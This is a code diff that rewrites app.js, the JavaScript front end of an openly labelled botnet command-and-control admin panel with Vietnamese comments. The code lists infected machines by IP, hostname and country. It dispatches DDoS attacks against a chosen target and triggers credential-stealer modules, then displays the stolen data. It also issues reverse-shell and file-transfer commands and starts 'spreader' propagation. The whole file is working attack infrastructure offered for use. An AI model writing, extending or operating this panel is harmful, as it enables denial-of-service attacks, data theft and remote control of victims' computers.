@@ -1,238 +1,580 @@
-// C2 Botnet Panel - Full JavaScript
+/**
+ * app.js
+ * C2 Botnet Admin Panel - JavaScript
+ * Chuc nang: dang nhap, quan ly bot, gui lenh, xem steal, export, realtime log
+ */
+
+/* Bien toan cuc */
 let authToken = '';
 let serverBaseURL = '';
 
+/**
+ * Khoi tao khi trang duoc load
+ */
 document.addEventListener('DOMContentLoaded', function() {
+    /* Xac dinh URL server */
     serverBaseURL = window.location.origin;
+    
+    /* Kiem tra token da luu */
     const savedToken = localStorage.getItem('c2_auth_token');
-    if (savedToken) { authToken = savedToken; showDashboard(); }
+    if (savedToken) {
+        authToken = savedToken;
+        showDashboard();
+    }
+    
+    /* Su kien form dang nhap */
     document.getElementById('login-form').addEventListener('submit', handleLogin);
+    
+    /* Su kien nut dang xuat */
     document.getElementById('btn-logout').addEventListener('click', handleLogout);
-    document.querySelectorAll('.nav-item').forEach(item => {
-        item.addEventListener('click', function(e) { e.preventDefault(); switchTab(this.getAttribute('data-tab')); });
+    
+    /* Su kien navigation tabs */
+    document.querySelectorAll('.nav-item').forEach(function(item) {
+        item.addEventListener('click', function(e) {
+            e.preventDefault();
+            var tabName = this.getAttribute('data-tab');
+            switchTab(tabName);
+        });
     });
+    
+    /* Su kien cac nut loc */
     document.getElementById('btn-filter').addEventListener('click', loadBots);
     document.getElementById('btn-delete-offline').addEventListener('click', deleteOfflineBots);
+    
+    /* Su kien gui lenh DDoS */
     document.getElementById('btn-send-ddos').addEventListener('click', sendDDoS);
+    
+    /* Su kien gui lenh Stealer */
     document.getElementById('btn-send-steal').addEventListener('click', sendStealer);
+    
+    /* Su kien gui lenh Remote */
     document.getElementById('btn-send-remote').addEventListener('click', sendRemote);
-    document.getElementById('btn-send-spread').addEventListener('click', sendSpreader);
-    document.getElementById('btn-filter-steals').addEventListener('click', loadSteals);
-    document.getElementById('btn-clear-log').addEventListener('click', ()=>{document.getElementById('full-log-box').innerHTML='';});
-    document.getElementById('btn-refresh-log').addEventListener('click', ()=>{loadLogs();});
     document.getElementById('remote-action-select').addEventListener('change', toggleRemoteFields);
+    
+    /* Su kien gui lenh Spreader */
+    document.getElementById('btn-send-spread').addEventListener('click', sendSpreader);
+    
+    /* Su kien loc steal */
+    document.getElementById('btn-filter-steals').addEventListener('click', loadSteals);
+    
+    /* Su kien log */
+    document.getElementById('btn-clear-log').addEventListener('click', function() {
+        document.getElementById('full-log-box').innerHTML = '';
+        document.getElementById('realtime-log-box').innerHTML = '';
+    });
+    document.getElementById('btn-refresh-log').addEventListener('click', function() {
+        var flb = document.getElementById('full-log-box');
+        var rlb = document.getElementById('realtime-log-box');
+        if (rlb) { flb.innerHTML = rlb.innerHTML; }
+    });
+    
+    /* Cap nhat dong ho server */
     setInterval(updateServerTime, 1000);
     updateServerTime();
 });
 
+/**
+ * Ham dang nhap
+ */
 function handleLogin(e) {
     e.preventDefault();
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-    const errorEl = document.getElementById('login-error');
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+    var errorEl = document.getElementById('login-error');
+    
     fetch(serverBaseURL + '/api/login', {
-        method: 'POST', headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({username:username,password:password})
-    }).then(r=>r.json()).then(data=>{
-        if(data.success){ authToken=data.data.token; localStorage.setItem('c2_auth_token',authToken); showDashboard(); }
-        else { errorEl.textContent=data.message||'Đăng nhập thất bại'; errorEl.style.display='block'; }
-    }).catch(err=>{ errorEl.textContent='Lỗi kết nối'; errorEl.style.display='block'; });
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: username, password: password })
+    })
+    .then(function(response) { return response.json(); })
+    .then(function(data) {
+        if (data.success) {
+            authToken = data.data.token;
+            localStorage.setItem('c2_auth_token', authToken);
+            showDashboard();
+        } else {
+            errorEl.textContent = data.message || 'Dang nhap that bai';
+            errorEl.style.display = 'block';
+        }
+    })
+    .catch(function(err) {
+        errorEl.textContent = 'Loi ket noi den server: ' + err.message;
+        errorEl.style.display = 'block';
+    });
 }
 
+/**
+ * Ham dang xuat
+ */
 function handleLogout() {
-    localStorage.removeItem('c2_auth_token'); authToken='';
-    document.getElementById('login-page').style.display='flex';
-    document.getElementById('dashboard').style.display='none';
+    localStorage.removeItem('c2_auth_token');
+    authToken = '';
+    document.getElementById('login-page').style.display = 'flex';
+    document.getElementById('dashboard').style.display = 'none';
 }
 
+/**
+ * Hien thi dashboard sau khi dang nhap
+ */
 function showDashboard() {
-    document.getElementById('login-page').style.display='none';
-    document.getElementById('dashboard').style.display='flex';
-    switchTab('overview'); loadStats(); loadBots(); loadBotSelects();
-    setInterval(loadStats,30000); setInterval(loadBots,30000);
+    document.getElementById('login-page').style.display = 'none';
+    document.getElementById('dashboard').style.display = 'flex';
+    
+    /* Load du lieu ban dau */
+    switchTab('overview');
+    loadStats();
+    loadBots();
+    loadBotSelects();
+    
+    /* Tu dong refresh */
+    setInterval(loadStats, 30000);
+    setInterval(loadBots, 30000);
 }
 
+/**
+ * Chuyen tab
+ */
 function switchTab(tabName) {
-    document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active'));
-    document.querySelector('.nav-item[data-tab="'+tabName+'"]').classList.add('active');
-    document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));
-    document.getElementById('tab-'+tabName).classList.add('active');
-    if(tabName==='overview') loadStats();
-    if(tabName==='bots') loadBots();
-    if(tabName==='stealer') loadSteals();
+    /* Cap nhat navigation */
+    document.querySelectorAll('.nav-item').forEach(function(item) {
+        item.classList.remove('active');
+        if (item.getAttribute('data-tab') === tabName) {
+            item.classList.add('active');
+        }
+    });
+    
+    /* Cap nhat noi dung */
+    document.querySelectorAll('.tab-content').forEach(function(content) {
+        content.classList.remove('active');
+    });
+    document.getElementById('tab-' + tabName).classList.add('active');
+    
+    /* Load du lieu cho tab */
+    if (tabName === 'overview') { loadStats(); }
+    if (tabName === 'bots') { loadBots(); loadBotSelects(); }
+    if (tabName === 'stealer') { loadSteals(); }
 }
 
+/**
+ * API call helper
+ */
 function apiCall(endpoint, method, body) {
-    const headers={'Content-Type':'application/json'};
-    if(authToken) headers['Authorization']='Bearer '+authToken;
-    const opts={method:method||'GET',headers:headers};
-    if(body) opts.body=JSON.stringify(body);
-    return fetch(serverBaseURL+endpoint,opts).then(r=>r.json()).catch(e=>({success:false,message:e.message}));
+    var headers = { 'Content-Type': 'application/json' };
+    if (authToken) {
+        headers['Authorization'] = 'Bearer ' + authToken;
+    }
+    
+    var options = { method: method || 'GET', headers: headers };
+    if (body) { options.body = JSON.stringify(body); }
+    
+    return fetch(serverBaseURL + endpoint, options)
+        .then(function(response) { return response.json(); })
+        .catch(function(err) {
+            console.error('API call error:', err);
+            return { success: false, message: err.message };
+        });
 }
 
+/**
+ * Load thong ke tong quan
+ */
 function loadStats() {
-    apiCall('/api/stats').then(d=>{if(d.success) updateStatsUI(d.data);});
+    apiCall('/api/stats').then(function(data) {
+        if (data.success) { updateStatsUI(data.data); }
+    });
 }
 
-function updateStatsUI(s) {
-    if(!s) return;
-    document.getElementById('stat-total-bots').textContent=s.total_bots||0;
-    document.getElementById('stat-online-bots').textContent=s.online_bots||0;
-    document.getElementById('stat-offline-bots').textContent=s.offline_bots||0;
-    document.getElementById('stat-total-commands').textContent=s.total_commands||0;
-    document.getElementById('stat-total-steals').textContent=s.total_steals||0;
-    if(s.countries){
-        const cd=document.getElementById('chart-countries'); cd.innerHTML='';
-        const max=Math.max(...Object.values(s.countries),1);
-        for(const[c,ct]of Object.entries(s.countries)){
-            const p=ct/max*100;
-            cd.innerHTML+='<div class="bar-row"><span class="bar-label">'+(c||'Unknown')+'</span><div class="bar-track"><div class="bar-fill" style="width:'+p+'%"></div></div><span class="bar-count">'+ct+'</span></div>';
-        }
+/**
+ * Cap nhat UI thong ke
+ */
+function updateStatsUI(stats) {
+    if (!stats) { return; }
+    
+    document.getElementById('stat-total-bots').textContent = stats.total_bots || 0;
+    document.getElementById('stat-online-bots').textContent = stats.online_bots || 0;
+    document.getElementById('stat-offline-bots').textContent = stats.offline_bots || 0;
+    document.getElementById('stat-total-commands').textContent = stats.total_commands || 0;
+    document.getElementById('stat-total-steals').textContent = stats.total_steals || 0;
+    
+    /* Cap nhat bieu do quoc gia */
+    if (stats.countries) {
+        var countriesDiv = document.getElementById('chart-countries');
+        countriesDiv.innerHTML = '';
+        var entries = Object.entries(stats.countries);
+        var maxCount = Math.max.apply(null, entries.map(function(e) { return e[1]; }));
+        if (maxCount < 1) { maxCount = 1; }
+        
+        entries.forEach(function(entry) {
+            var country = entry[0];
+            var count = entry[1];
+            var percent = (count / maxCount * 100);
+            var row = document.createElement('div');
+            row.className = 'bar-row';
+            row.innerHTML = '<span class="bar-label">' + (country || 'Unknown') + '</span>' +
+                '<div class="bar-track"><div class="bar-fill" style="width:' + percent + '%"></div></div>' +
+                '<span class="bar-count">' + count + '</span>';
+            countriesDiv.appendChild(row);
+        });
     }
-    if(s.os_distribution){
-        const od=document.getElementById('chart-os'); od.innerHTML='';
-        const max=Math.max(...Object.values(s.os_distribution),1);
-        for(const[o,ct]of Object.entries(s.os_distribution)){
-            const p=ct/max*100;
-            od.innerHTML+='<div class="bar-row"><span class="bar-label">'+o+'</span><div class="bar-track"><div class="bar-fill" style="width:'+p+'%"></div></div><span class="bar-count">'+ct+'</span></div>';
-        }
+    
+    /* Cap nhat bieu do OS */
+    if (stats.os_distribution) {
+        var osDiv = document.getElementById('chart-os');
+        osDiv.innerHTML = '';
+        var entries = Object.entries(stats.os_distribution);
+        var maxCount = Math.max.apply(null, entries.map(function(e) { return e[1]; }));
+        if (maxCount < 1) { maxCount = 1; }
+        
+        entries.forEach(function(entry) {
+            var os = entry[0];
+            var count = entry[1];
+            var percent = (count / maxCount * 100);
+            var row = document.createElement('div');
+            row.className = 'bar-row';
+            row.innerHTML = '<span class="bar-label">' + os + '</span>' +
+                '<div class="bar-track"><div class="bar-fill" style="width:' + percent + '%"></div></div>' +
+                '<span class="bar-count">' + count + '</span>';
+            osDiv.appendChild(row);
+        });
     }
 }
 
+/**
+ * Load danh sach bot
+ */
 function loadBots() {
-    const search=document.getElementById('filter-search').value;
-    const status=document.getElementById('filter-status').value;
-    let q=''; if(search) q+='&search='+encodeURIComponent(search); if(status) q+='&status='+encodeURIComponent(status);
-    apiCall('/api/bots?'+(q?q.substring(1):'')).then(d=>{if(d.success&&d.data.bots) renderBotsTable(d.data.bots);});
+    var search = document.getElementById('filter-search').value;
+    var status = document.getElementById('filter-status').value;
+    var query = '';
+    if (search) { query += '&search=' + encodeURIComponent(search); }
+    if (status) { query += '&status=' + encodeURIComponent(status); }
+    
+    apiCall('/api/bots?' + (query ? query.substring(1) : '')).then(function(data) {
+        if (data.success && data.data && data.data.bots) {
+            renderBotsTable(data.data.bots);
+        }
+    });
 }
 
+/**
+ * Render bang bot
+ */
 function renderBotsTable(bots) {
-    const tbody=document.getElementById('bots-table-body'); tbody.innerHTML='';
-    if(!bots.length){tbody.innerHTML='<tr><td colspan="8" style="text-align:center;padding:20px;">Không có bot</td></tr>';return;}
-    bots.forEach(b=>{
-        const tr=document.createElement('tr');
-        tr.innerHTML='<td style="font-family:monospace;font-size:11px;">'+b.id.substring(0,12)+'...</td>'+
-        '<td>'+b.hostname+'</td><td>'+b.os+'</td><td>'+b.ip+'</td><td>'+(b.country||'N/A')+'</td>'+
-        '<td>'+new Date(b.last_seen).toLocaleString('vi-VN')+'</td>'+
-        '<td><span class="status-badge '+(b.status==='online'?'status-online':'status-offline')+'">'+(b.status==='online'?'Online':'Offline')+'</span></td>'+
-        '<td><button class="btn btn-primary btn-sm" onclick="deleteBot(\''+b.id+'\')">Xóa</button></td>';
+    var tbody = document.getElementById('bots-table-body');
+    tbody.innerHTML = '';
+    
+    if (bots.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;padding:20px;">Khong co bot nao</td></tr>';
+        return;
+    }
+    
+    bots.forEach(function(bot) {
+        var tr = document.createElement('tr');
+        var lastSeen = new Date(bot.last_seen).toLocaleString('vi-VN');
+        var statusClass = (bot.status === 'online') ? 'status-online' : 'status-offline';
+        var statusText = (bot.status === 'online') ? 'Online' : 'Offline';
+        
+        tr.innerHTML = '<td style="font-family:monospace;font-size:11px;">' + bot.id.substring(0, 12) + '...</td>' +
+            '<td>' + (bot.hostname || 'N/A') + '</td>' +
+            '<td>' + (bot.os || 'N/A') + '</td>' +
+            '<td>' + (bot.ip || 'N/A') + '</td>' +
+            '<td>' + (bot.country || 'N/A') + '</td>' +
+            '<td>' + lastSeen + '</td>' +
+            '<td><span class="status-badge ' + statusClass + '">' + statusText + '</span></td>' +
+            '<td>' +
+                '<button class="btn btn-primary btn-sm" onclick="viewBotDetail(\'' + bot.id + '\')">Chi tiet</button> ' +
+                '<button class="btn btn-danger btn-sm" onclick="deleteBot(\'' + bot.id + '\')">Xoa</button>' +
+            '</td>';
         tbody.appendChild(tr);
     });
 }
 
+/**
+ * Xem chi tiet bot
+ */
+function viewBotDetail(botID) {
+    apiCall('/api/bots/' + botID).then(function(data) {
+        if (data.success) {
+            var info = JSON.stringify(data.data, null, 2);
+            alert('Thong tin bot:\n\n' + info.substring(0, 1000));
+        }
+    });
+}
+
+/**
+ * Xoa bot
+ */
 function deleteBot(botID) {
-    if(!confirm('Xóa bot '+botID+'?')) return;
-    apiCall('/api/bots/'+botID,'DELETE').then(d=>{
-        addLog(d.success?'success':'error',d.message); loadBots(); loadStats();
+    if (!confirm('Ban co chac muon xoa bot ' + botID + '?')) { return; }
+    apiCall('/api/bots/' + botID, 'DELETE').then(function(data) {
+        addLog(data.success ? 'success' : 'error', data.message);
+        loadBots();
+        loadStats();
+        loadBotSelects();
     });
 }
 
+/**
+ * Xoa tat ca bot offline
+ */
 function deleteOfflineBots() {
-    if(!confirm('Xóa tất cả bot offline?')) return;
-    apiCall('/api/bots?status=offline').then(d=>{
-        if(d.success&&d.data.bots){ d.data.bots.forEach(b=>{apiCall('/api/bots/'+b.id,'DELETE');}); }
-        setTimeout(()=>{loadBots();loadStats();},1000);
+    if (!confirm('Ban co chac muon xoa TAT CA bot offline?')) { return; }
+    apiCall('/api/bots?status=offline').then(function(data) {
+        if (data.success && data.data && data.data.bots) {
+            var promises = [];
+            data.data.bots.forEach(function(bot) {
+                promises.push(apiCall('/api/bots/' + bot.id, 'DELETE'));
+            });
+            Promise.all(promises).then(function() {
+                addLog('success', 'Da xoa tat ca bot offline');
+                loadBots();
+                loadStats();
+                loadBotSelects();
+            });
+        }
     });
 }
 
+/**
+ * Load danh sach bot cho cac select
+ */
 function loadBotSelects() {
-    apiCall('/api/bots?status=online&limit=200').then(d=>{
-        if(!d.success||!d.data.bots) return;
-        const selects=['ddos-bot-select','steal-bot-select','remote-bot-select','spread-bot-select'];
-        selects.forEach(sid=>{
-            const sel=document.getElementById(sid);
-            sel.innerHTML='<option value="all">Tất cả Bot Online</option>';
-            d.data.bots.forEach(b=>{sel.innerHTML+='<option value="'+b.id+'">'+b.hostname+' ('+b.ip+')</option>';});
+    apiCall('/api/bots?status=online&limit=200').then(function(data) {
+        if (!data.success || !data.data || !data.data.bots) { return; }
+        
+        var selects = ['ddos-bot-select', 'steal-bot-select', 'remote-bot-select', 'spread-bot-select'];
+        selects.forEach(function(selectId) {
+            var sel = document.getElementById(selectId);
+            if (!sel) { return; }
+            sel.innerHTML = '<option value="all">Tat ca Bot Online</option>';
+            data.data.bots.forEach(function(bot) {
+                sel.innerHTML += '<option value="' + bot.id + '">' + bot.hostname + ' (' + bot.ip + ')</option>';
+            });
         });
     });
 }
 
+/**
+ * Gui lenh DDoS
+ */
 function sendDDoS() {
-    const target=document.getElementById('ddos-target').value;
-    const port=document.getElementById('ddos-port').value;
-    const threads=document.getElementById('ddos-threads').value;
-    const duration=document.getElementById('ddos-duration').value;
-    const method=document.getElementById('ddos-method').value;
-    const botID=document.getElementById('ddos-bot-select').value;
-    if(!target){alert('Nhập mục tiêu!');return;}
-    const params=JSON.stringify({url:target,port:parseInt(port),threads:parseInt(threads),duration:parseInt(duration)});
-    apiCall('/api/command','POST',{bot_id:botID,module:'ddos',action:method,params:params}).then(d=>{
-        addLog(d.success?'success':'error',d.message);
-        document.getElementById('ddos-result').innerHTML+='<div class="log-entry"><span class="type '+(d.success?'success':'error')+'">['+new Date().toLocaleTimeString('vi-VN')+']</span> '+d.message+'</div>';
+    var target = document.getElementById('ddos-target').value;
+    var port = document.getElementById('ddos-port').value;
+    var threads = document.getElementById('ddos-threads').value;
+    var duration = document.getElementById('ddos-duration').value;
+    var method = document.getElementById('ddos-method').value;
+    var botID = document.getElementById('ddos-bot-select').value;
+    
+    if (!target) { alert('Vui long nhap muc tieu!'); return; }
+    
+    var params = JSON.stringify({
+        url: target,
+        port: parseInt(port),
+        threads: parseInt(threads),
+        duration: parseInt(duration)
+    });
+    
+    apiCall('/api/command', 'POST', {
+        bot_id: botID,
+        module: 'ddos',
+        action: method,
+        params: params
+    }).then(function(data) {
+        addLog(data.success ? 'success' : 'error', data.message);
+        var resultDiv = document.getElementById('ddos-result');
+        if (resultDiv) {
+            resultDiv.innerHTML += '<div class="log-entry"><span class="type ' + (data.success ? 'success' : 'error') + '">[' + new Date().toLocaleTimeString('vi-VN') + ']</span> ' + data.message + '</div>';
+        }
     });
 }
 
+/**
+ * Gui lenh Stealer
+ */
 function sendStealer() {
-    const mod=document.getElementById('steal-module-select').value;
-    const botID=document.getElementById('steal-bot-select').value;
-    apiCall('/api/command','POST',{bot_id:botID,module:'stealer',action:mod,params:'{}'}).then(d=>{
-        addLog(d.success?'success':'error',d.message);
-        setTimeout(loadSteals,5000);
+    var module = document.getElementById('steal-module-select').value;
+    var botID = document.getElementById('steal-bot-select').value;
+    
+    apiCall('/api/command', 'POST', {
+        bot_id: botID,
+        module: 'stealer',
+        action: module,
+        params: '{}'
+    }).then(function(data) {
+        addLog(data.success ? 'success' : 'error', data.message);
+        setTimeout(loadSteals, 5000);
     });
 }
 
+/**
+ * Gui lenh Remote Access
+ */
 function sendRemote() {
-    const action=document.getElementById('remote-action-select').value;
-    const botID=document.getElementById('remote-bot-select').value;
-    const ip=document.getElementById('remote-ip').value;
-    const port=document.getElementById('remote-port').value;
-    const path=document.getElementById('remote-path').value;
-    const params=JSON.stringify({ip:ip,port:parseInt(port),path:path});
-    apiCall('/api/command','POST',{bot_id:botID,module:'remote',action:action,params:params}).then(d=>{
-        addLog(d.success?'success':'error',d.message);
-        document.getElementById('remote-result').innerHTML+='<div class="log-entry"><span class="type '+(d.success?'success':'error')+'">['+new Date().toLocaleTimeString('vi-VN')+']</span> '+d.message+'</div>';
+    var action = document.getElementById('remote-action-select').value;
+    var botID = document.getElementById('remote-bot-select').value;
+    var ip = document.getElementById('remote-ip').value;
+    var port = document.getElementById('remote-port').value;
+    var path = document.getElementById('remote-path').value;
+    
+    var params = JSON.stringify({
+        ip: ip,
+        port: parseInt(port),
+        path: path
+    });
+    
+    apiCall('/api/command', 'POST', {
+        bot_id: botID,
+        module: 'remote',
+        action: action,
+        params: params
+    }).then(function(data) {
+        addLog(data.success ? 'success' : 'error', data.message);
+        var resultDiv = document.getElementById('remote-result');
+        if (resultDiv) {
+            resultDiv.innerHTML += '<div class="log-entry"><span class="type ' + (data.success ? 'success' : 'error') + '">[' + new Date().toLocaleTimeString('vi-VN') + ']</span> ' + data.message + '</div>';
+        }
     });
 }
 
-function sendSpreader() {
-    const method=document.getElementById('spread-method-select').value;
-    const botID=document.getElementById('spread-bot-select').value;
-    apiCall('/api/command','POST',{bot_id:botID,module:'spreader',action:method,params:'{}'}).then(d=>{
-        addLog(d.success?'success':'error',d.message);
-        document.getElementById('spread-result').innerHTML+='<div class="log-entry"><span class="type '+(d.success?'success':'error')+'">['+new Date().toLocaleTimeString('vi-VN')+']</span> '+d.message+'</div>';
-    });
-}
-
+/**
+ * Hien/an truong IP/Port/Path cho Remote Access
+ */
 function toggleRemoteFields() {
-    const action=document.getElementById('remote-action-select').value;
-    document.getElementById('row-remote-ip').style.display=(action==='reverse_shell')?'flex':'none';
-    document.getElementById('row-remote-port').style.display=(action==='reverse_shell')?'flex':'none';
-    document.getElementById('row-remote-path').style.display=(action==='download_file'||action==='upload_file')?'flex':'none';
+    var action = document.getElementById('remote-action-select').value;
+    var rowIP = document.getElementById('row-remote-ip');
+    var rowPort = document.getElementById('row-remote-port');
+    var rowPath = document.getElementById('row-remote-path');
+    
+    if (rowIP) { rowIP.style.display = (action === 'reverse_shell') ? 'flex' : 'none'; }
+    if (rowPort) { rowPort.style.display = (action === 'reverse_shell') ? 'flex' : 'none'; }
+    if (rowPath) { rowPath.style.display = (action === 'download_file' || action === 'upload_file') ? 'flex' : 'none'; }
 }
 
-function loadSteals() {
-    const dt=document.getElementById('steal-filter-type').value;
-    let q=''; if(dt) q+='&data_type='+encodeURIComponent(dt);
-    apiCall('/api/steals?limit=50'+(q||'')).then(d=>{
-        if(!d.success||!d.data.steals) return;
-        const c=document.getElementById('steals-data-container'); c.innerHTML='';
-        d.data.steals.forEach(s=>{
-            let p=''; try{p=JSON.stringify(JSON.parse(s.data),null,2);}catch(e){p=s.data.substring(0,500);}
-            if(p.length>500) p=p.substring(0,500)+'...';
-            c.innerHTML+='<div class="data-card"><h4>'+s.data_type.toUpperCase()+' - '+s.bot_id.substring(0,8)+'...</h4><p style="font-size:11px;color:var(--text-muted);">'+new Date(s.timestamp).toLocaleString('vi-VN')+'</p><pre>'+escapeHtml(p)+'</pre></div>';
-        });
+/**
+ * Gui lenh Spreader
+ */
+function sendSpreader() {
+    var method = document.getElementById('spread-method-select').value;
+    var botID = document.getElementById('spread-bot-select').value;
+    
+    apiCall('/api/command', 'POST', {
+        bot_id: botID,
+        module: 'spreader',
+        action: method,
+        params: '{}'
+    }).then(function(data) {
+        addLog(data.success ? 'success' : 'error', data.message);
+        var resultDiv = document.getElementById('spread-result');
+        if (resultDiv) {
+            resultDiv.innerHTML += '<div class="log-entry"><span class="type ' + (data.success ? 'success' : 'error') + '">[' + new Date().toLocaleTimeString('vi-VN') + ']</span> ' + data.message + '</div>';
+        }
     });
 }
 
-function loadLogs() {
-    const lb=document.getElementById('full-log-box');
-    const rlb=document.getElementById('realtime-log-box');
-    lb.innerHTML=rlb?rlb.innerHTML:'';
+/**
+ * Load du lieu steal
+ */
+function loadSteals() {
+    var dataType = document.getElementById('steal-filter-type').value;
+    var query = '';
+    if (dataType) { query += '&data_type=' + encodeURIComponent(dataType); }
+    
+    apiCall('/api/steals?limit=50' + (query || '')).then(function(data) {
+        if (data.success && data.data && data.data.steals) {
+            renderSteals(data.data.steals);
+        }
+    });
 }
 
-function addLog(type, message) {
-    const now=new Date(); const ts='['+now.toLocaleTimeString('vi-VN')+']';
-    const entry='<div class="log-entry"><span class="time">'+ts+'</span><span class="type '+type+'">'+type.toUpperCase()+'</span> '+message+'</div>';
-    const rlb=document.getElementById('realtime-log-box'); if(rlb){rlb.innerHTML=entry+rlb.innerHTML; if(rlb.children.length>500) rlb.removeChild(rlb.lastChild);}
-    const flb=document.getElementById('full-log-box'); if(flb){flb.innerHTML=entry+flb.innerHTML; if(flb.children.length>500) flb.removeChild(flb.lastChild);}
+/**
+ * Render du lieu steal
+ */
+function renderSteals(steals) {
+    var container = document.getElementById('steals-data-container');
+    if (!container) { return; }
+    container.innerHTML = '';
+    
+    if (steals.length === 0) {
+        container.innerHTML = '<p style="text-align:center;padding:40px;">Khong co du lieu steal nao</p>';
+        return;
+    }
+    
+    steals.forEach(function(steal) {
+        var card = document.createElement('div');
+        card.className = 'data-card';
+        
+        var dataPreview = '';
+        try {
+            var parsed = JSON.parse(steal.data);
+            dataPreview = JSON.stringify(parsed, null, 2);
+        } catch(e) {
+            dataPreview = steal.data.substring(0, 500);
+        }
+        
+        if (dataPreview.length > 1000) {
+            dataPreview = dataPreview.substring(0, 1000) + '\n\n... (con tiep, bam Export de tai toan bo)';
+        }
+        
+        var timestamp = new Date(steal.timestamp).toLocaleString('vi-VN');
+        
+        card.innerHTML = '<h4>' + steal.data_type.toUpperCase() + ' - Bot: ' + steal.bot_id.substring(0, 8) + '...</h4>' +
+            '<p style="font-size:11px;color:var(--text-muted);margin-bottom:5px;">' + timestamp + '</p>' +
+            '<pre>' + escapeHtml(dataPreview) + '</pre>';
+        container.appendChild(card);
+    });
 }
 
+/**
+ * Escape HTML
+ */
 function escapeHtml(text) {
-    const map={'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};
-    return text.replace(/[&<>"']/g,m=>map[m]);
+    var map = {
+        '&': '&amp;',
+        '<': '&lt;',
+        '>': '&gt;',
+        '"': '&quot;',
+        "'": '&#039;'
+    };
+    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
 }
 
+/**
+ * Them log vao khung realtime
+ */
+function addLog(type, message) {
+    var now = new Date();
+    var timeStr = '[' + now.toLocaleTimeString('vi-VN') + ']';
+    var entryHTML = '<div class="log-entry"><span class="time">' + timeStr + '</span>' +
+        '<span class="type ' + type + '">' + type.toUpperCase() + '</span> ' + message + '</div>';
+    
+    /* Them vao realtime log box */
+    var rlb = document.getElementById('realtime-log-box');
+    if (rlb) {
+        rlb.innerHTML = entryHTML + rlb.innerHTML;
+        /* Gioi han so log */
+        while (rlb.children.length > 500) {
+            rlb.removeChild(rlb.lastChild);
+        }
+    }
+    
+    /* Them vao full log box */
+    var flb = document.getElementById('full-log-box');
+    if (flb) {
+        flb.innerHTML = entryHTML + flb.innerHTML;
+        while (flb.children.length > 500) {
+            flb.removeChild(flb.lastChild);
+        }
+    }
+}
+
+/**
+ * Cap nhat dong ho server
+ */
 function updateServerTime() {
-    const el=document.getElementById('server-time');
-    if(el){const n=new Date();el.textContent=n.toLocaleDateString('vi-VN')+' '+n.toLocaleTimeString('vi-VN');}
+    var el = document.getElementById('server-time');
+    if (el) {
+        var now = new Date();
+        el.textContent = now.toLocaleDateString('vi-VN') + ' ' + now.toLocaleTimeString('vi-VN');
+    }
 }
